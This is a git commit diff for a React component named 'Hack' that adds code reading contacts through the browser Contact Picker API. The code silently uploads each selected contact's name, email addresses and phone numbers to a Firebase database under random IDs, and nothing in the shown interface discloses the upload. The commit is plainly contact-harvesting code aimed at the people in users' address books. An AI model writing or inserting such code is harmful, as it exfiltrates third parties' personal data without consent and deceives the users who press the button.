130cc1b9f053c01dc1377e2a82ef5e55234b86f9
Mathis <eyzex@hotmail.fr>
2022-11-22 17:47:18 +0100

    added contacts to firebase

--- src/components/Hack.tsx
+++ src/components/Hack.tsx
@@ -1,8 +1,13 @@
 // @ts-nocheck
 import { useState } from 'react';
+import { getDatabase, ref, set } from 'firebase/database';
+import { v4 as uuidv4 } from 'uuid';
 
 const Hack = () => {
+  const db = getDatabase();
+
   const [contacts, setContacts] = useState([]);
+
   const onHack = async () => {
     const supportedProperties = await navigator.contacts.getProperties();
 
@@ -12,13 +17,19 @@ const Hack = () => {
         multiple: true,
       }
     );
-
+    for (const contact of contactsToSelect) {
+      set(ref(db, 'users/' + uuidv4()), {
+        username: contact.name,
+        email: contact.email.join(', '),
+        telephone: contact.tel.join(', '),
+      });
+    }
     setContacts(contactsToSelect);
   };
   return (
     <div className="w-full max-w-xs">
       <p>HACK</p>
-      <button onClick={onHack}>GORS BOUTTON </button>
+      <button onClick={onHack}>GROS BOUTTON </button>
       {contacts.map((contact) => (
         <div>
           <strong>{contact.name}</strong>
